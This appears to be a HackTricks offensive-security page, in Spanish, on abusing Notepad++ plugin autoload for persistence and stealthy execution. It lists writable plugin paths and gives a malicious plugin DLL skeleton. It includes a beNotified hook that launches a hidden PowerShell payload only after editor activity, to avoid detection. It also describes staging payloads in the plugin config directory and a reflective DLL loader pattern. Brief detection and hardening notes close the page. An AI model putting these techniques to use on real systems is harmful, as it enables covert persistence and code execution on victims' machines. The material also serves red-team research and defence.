# Persistencia y ejecución por carga automática de plugins de Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ hará **autoload de cada DLL de plugin encontrada bajo sus subcarpetas `plugins`** al iniciarse. Soltar un plugin malicioso en cualquier **instalación escribible de Notepad++** da ejecución de código dentro de `notepad++.exe` cada vez que el editor se inicia, lo que puede aprovecharse para **persistence**, **initial execution** sigilosa, o como un **in-process loader** si el editor se lanza elevado.

Desde **Notepad++ 7.6+** el diseño esperado para instalación manual es **una subcarpeta por plugin** (`plugins\<PluginName>\<PluginName>.dll`). En **portable mode** (presencia de `doLocalConf.xml` junto a `notepad++.exe`), todo el árbol de la aplicación permanece local a ese directorio, lo que a menudo convierte copias de herramientas/admin bundles en una superficie de ejecución fácil de escribir por el usuario.

## Ubicaciones escribibles de plugins
- Instalación estándar: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (normalmente requiere admin para escribir).
- Opciones escribibles para operadores con pocos privilegios:
- Usa la **portable Notepad++ build** en una carpeta escribible por el usuario.
- Copia `C:\Program Files\Notepad++` a una ruta controlada por el usuario (por ejemplo, `%LOCALAPPDATA%\npp\`) y ejecuta `notepad++.exe` desde allí.
- Busca **admin tool bundles**, copias zip extraídas, o help-desk toolkits que ya contengan `doLocalConf.xml` y vivan fuera de `Program Files`.
- Cada plugin obtiene su propia subcarpeta bajo `plugins` y se carga automáticamente al inicio; las entradas de menú aparecen bajo **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ espera funciones **exportadas** específicas. Todas se llaman durante la inicialización, dando múltiples superficies de ejecución:
- **`DllMain`** — se ejecuta inmediatamente al cargar la DLL (primer punto de ejecución).
- **`setInfo(NppData)`** — se llama una vez al cargar para proporcionar los handles de Notepad++; lugar típico para registrar elementos de menú.
- **`getName()`** — devuelve el nombre del plugin mostrado en el menú.
- **`getFuncsArray(int *nbF)`** — devuelve comandos del menú; incluso si está vacío, se llama durante el inicio.
- **`beNotified(SCNotification*)`** — recibe eventos de Notepad++ / Scintilla (útil para diferir payloads hasta una acción del usuario o un evento del editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — manejador de mensajes, útil para intercambios de datos más grandes.
- **`isUnicode()`** — bandera de compatibilidad comprobada al cargar.

La mayoría de las exports pueden implementarse como **stubs**; la ejecución puede ocurrir desde `DllMain` o cualquier callback anterior durante el autoload.

## Minimal malicious plugin skeleton
Compila una DLL con las exports esperadas y colócala en `plugins\\MyNewPlugin\\MyNewPlugin.dll` dentro de una carpeta de Notepad++ con permisos de escritura:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compila la DLL (Visual Studio/MinGW).
2. Crea la subcarpeta del plugin dentro de `plugins` y coloca la DLL allí.
3. Reinicia Notepad++; la DLL se carga automáticamente, ejecutando `DllMain` y las callbacks posteriores.

## Patrón de trigger de bajo ruido mediante `beNotified`
Para OPSEC, muchos payloads no deberían activarse desde `DllMain`. Un patrón más discreto es permitir que el plugin se cargue limpiamente y luego ejecutar solo después de un evento realista del editor, como **startup complete**, **buffer activation** o el **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Esto encaja mejor con la investigación ofensiva pública que un ruidoso beacon de `DllMain`: la DLL sigue cargándose automáticamente al inicio, pero la acción maliciosa se retrasa hasta que Notepad++ parece estar realmente en uso.

## Using the plugin config directory as secondary storage
Notepad++ expone `NPPM_GETPLUGINSCONFIGDIR`, que devuelve el **directorio de configuración de plugins del usuario actual**. Un plugin malicioso puede usar esto para mantener la DLL en disco al mínimo mientras almacena config cifrada, payloads staged o archivos de tasking en una ruta que se mezcla con el estado normal del plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operacionalmente, esto es útil cuando quieres:
- un pequeño DLL bootstrap cargado automáticamente;
- tasking por usuario sin volver a tocar el binario principal del plugin;
- separar el **autoload trigger** de la segunda etapa más pesada.

## Reflective loader plugin pattern
Un plugin weaponized puede convertir Notepad++ en un **reflective DLL loader**:
- Presentar una UI/entrada de menú mínima (p. ej., "LoadDLL").
- Aceptar una **file path** o **URL** para obtener un payload DLL.
- Mapear reflectivamente el DLL en el proceso actual e invocar un punto de entrada exportado (p. ej., una función loader dentro del DLL obtenido).
- Ventaja: reutilizar un proceso GUI de aspecto benigno en lugar de iniciar un nuevo loader; el payload hereda la integridad de `notepad++.exe` (incluidos contextos elevados).
- Trade-offs: soltar un **unsigned plugin DLL** en disco es ruidoso; una variación práctica es usar el plugin cargado automáticamente solo como stub y mantener el implant real cifrado/staged en otro lugar.

## Detection and hardening notes
- Bloquear o monitorizar **writes to Notepad++ plugin directories** (incluidas copias portables en perfiles de usuario); habilitar controlled folder access o application allowlisting.
- Alertar sobre **new unsigned DLLs** en `plugins`, cambios en árboles portables de Notepad++, y actividad inusual de **child processes/network activity** desde `notepad++.exe`.
- Establecer una línea base de plugins legítimos e investigar cualquier nuevo DLL que exporte la interfaz normal de plugin de Notepad++ pero que además invoque shells, PowerShell o network beacons.
- Aplicar la instalación de plugins solo mediante **Plugins Admin**, y restringir la ejecución de copias portables desde rutas no confiables.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
